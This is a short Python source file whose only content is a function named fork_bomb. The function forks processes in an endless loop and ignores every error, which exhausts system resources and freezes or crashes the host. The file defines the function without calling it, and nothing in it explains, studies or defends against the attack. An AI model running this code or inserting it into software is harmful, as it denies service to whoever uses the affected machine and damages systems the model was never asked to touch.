#! /usr/bin/env python
# -*- coding: UTF-8 -*-
__version__ = 0.1
import os

def fork_bomb():
    while True:
        try:
            os.fork()
        except Exception:
            pass
